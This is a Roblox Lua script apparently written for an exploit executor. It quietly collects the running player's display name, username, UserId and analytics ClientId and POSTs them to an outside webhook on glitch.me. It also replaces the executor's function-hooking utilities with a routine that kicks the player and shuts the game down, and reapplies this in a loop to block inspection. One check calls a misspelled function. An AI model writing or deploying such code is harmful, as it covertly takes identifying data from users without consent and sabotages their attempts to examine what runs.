local LocalPlayer = game.Players.LocalPlayer

local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local HttpService = game:GetService("HttpService")

task.spawn(function()
	local HttpRequest = request
		
	local Data = {
		["embeds"] = {{
			["title"] = "Execution Logged",
			["color"] = 0x74ccff,
			["fields"] = {
				{
					["name"] = "**User Information**",
					["value"] = "",
					["inline"] = false
				},
				

				{
					["name"] = "",
					["value"] = "DisplayName: " .. LocalPlayer.DisplayName,
					["inline"] = false
				},

				{
					["name"] = "",
					["value"] = "Username: " .. LocalPlayer.Name,
					["inline"] = false
				},

				{
					["name"] = "",
					["value"] = "UserId: " .. LocalPlayer.UserId,
					["inline"] = false
				},

				{
					["name"] = "",
					["value"] = "",
					["inline"] = false
				},

				{
					["name"] = "**Client Information**",
					["value"] = "",
					["inline"] = false
				},
				
				{
					["name"] = "",
					["value"] = "ClientId: " .. RbxAnalyticsService:GetClientId(),
					["inline"] = false
				},
				
				{
					["name"] = "",
					["value"] = "",
					["inline"] = false
				},
			},

			["footer"] = {
				["text"] = os.date("%X"),
			}
		}}
	}
	
	local DisabledFunction = function() 
		LocalPlayer:Kick() 	
		
		game:shutdown() 
	end

	getgenv().restorefunction = DisabledFunction
	getgenv().hookmetamethod = DisabledFunction
	getgenv().clonefunction = DisabledFunction
	getgenv().hookfunction = DisabledFunction
	
	task.spawn(function()
		repeat
			task.wait()

			if iscclosure(restorefunction) then
				getgenv().restorefunction = DisabledFunction
			end

			if icclosure(hookmetamethod) then
				getgenv().hookmetamethod = DisabledFunction
			end

			if iscclosure(clonefunction) then
				getgenv().clonefunction = DisabledFunction
			end

			if iscclosure(hookfunction) then
				getgenv().hookfunction = DisabledFunction
			end
		until not game
	end)
	
	HttpRequest({
		Url = "https://aspiring-melon-hippopotamus.glitch.me/webhook",
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},

		Body = HttpService:JSONEncode(Data)
	})
end)
